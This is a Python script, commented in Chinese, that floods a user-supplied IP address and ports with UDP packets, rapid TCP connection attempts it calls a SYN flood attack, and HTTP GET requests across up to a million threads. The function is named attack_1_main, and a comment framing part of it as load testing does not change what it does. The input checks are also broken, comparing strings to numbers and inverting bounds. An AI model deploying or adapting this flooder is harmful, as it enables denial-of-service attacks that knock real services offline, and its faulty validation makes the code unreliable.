import socket
import select
import threading
import random
import http.client
from queue import Queue
import time

# UDP 请求发送函数
def send_udp_requests(ip, ports, speed, queue):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_count = 0
    try:
        while True:
            port = random.choice(ports)  # 随机选择一个端口
            data = b"Test UDP Packet"
            sock.sendto(data, (ip, port))
            packet_count += 1
            queue.put(f"已发送第 {packet_count} 个UDP数据包到 {ip}:{port}")
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送UDP数据包。")
    except Exception as e:
        queue.put(f"UDP 发送发生错误: {e}")
    finally:
        sock.close()

# SYN 洪水攻击优化（模拟正常高并发连接测试）
def send_syn_flood(ip, ports, speed, queue):
    sockets = []
    for _ in range(10):  # 预先创建多个套接字
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.setblocking(0)
        sockets.append(sock)
    packet_count = 0
    try:
        while True:
            port = random.choice(ports)  # 随机选择一个端口
            for sock in sockets:
                try:
                    sock.connect_ex((ip, port))
                except BlockingIOError:
                    pass
                packet_count += 1
                queue.put(f"已发送第 {packet_count} 个SYN包到 {ip}:{port}")
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送SYN包。")
    except Exception as e:
        queue.put(f"SYN 发送发生错误: {e}")
    finally:
        for sock in sockets:
            sock.close()

# HTTP 请求发送优化（使用连接池）
def send_http_flood(ip, ports, speed, queue):
    connection_pool = [http.client.HTTPConnection(ip, port=random.choice(ports)) for _ in range(10)]
    pool_index = 0
    packet_count = 0
    try:
        while True:
            conn = connection_pool[pool_index]
            try:
                conn.request("GET", "/")
                response = conn.getresponse()
                packet_count += 1
                queue.put(f"已发送第 {packet_count} 个HTTP请求到 {ip}:{conn.port}")
            except Exception as e:
                queue.put(f"HTTP请求出错: {e}")
                conn.close()
                connection_pool[pool_index] = http.client.HTTPConnection(ip, port=random.choice(ports))
            pool_index = (pool_index + 1) % len(connection_pool)
            time.sleep(1 / speed)
    except KeyboardInterrupt:
        queue.put("用户手动终止，停止发送HTTP请求。")
    except Exception as e:
        queue.put(f"HTTP 发送发生错误: {e}")
    finally:
        for conn in connection_pool:
            conn.close()

# 输出线程函数
def print_output(queue):
    while True:
        message = queue.get()
        if message is None:
            break
        print(message)

def attack_1_main():
    ip_address = input("请输入IP地址:")
    print("多个端口用逗号分隔\n端口范围: 1 ~ 65535")
    port_numbers = input("请输入端口号:")
    if port_numbers < 65535:
        raise ValueError("端口不能大于 65535")
    elif port_numbers > 1:
        raise ValueError("端口不能小于 0")
    port_numbers = [int(port.strip()) for port in port_numbers.split(",")]
    request_speed = float(input("请输入请求速度(1 ~ 1 000):"))
    if request_speed < 0:
        raise ValueError("请求速度必须大于 0")
    elif request_speed < 1000:
        raise ValueError("请求速度必须小于 1 000")
    print("线程数量会影响程序性能，请根据实际情况调整\n建议数量 1 000 ~ 1 000 000")
    thread_count = int(input("请输入线程数量:"))
    if thread_count < 0:
        raise ValueError("线程数量必须大于 0")
    elif thread_count > 1000000:
        raise ValueError("线程数量必须小于 1 000 000")
    attack_types = ['udp', 'syn', 'http']
    threads = []
    output_queue = Queue()
    output_thread = threading.Thread(target=print_output, args=(output_queue,))
    output_thread.start()
    for i in range(thread_count):
        attack_type = random.choice(attack_types)
        if attack_type == 'udp':
            thread = threading.Thread(target=send_udp_requests, args=(ip_address, port_numbers, request_speed, output_queue))
        elif attack_type == 'syn':
            thread = threading.Thread(target=send_syn_flood, args=(ip_address, port_numbers, request_speed, output_queue))
        elif attack_type == 'http':
            thread = threading.Thread(target=send_http_flood, args=(ip_address, port_numbers, request_speed, output_queue))
        threads.append(thread)
        thread.start()
    try:
        for thread in threads:
            thread.join()
    except KeyboardInterrupt:
        print("主程序被用户手动终止。")
    finally:
        output_queue.put(None)
        output_thread.join()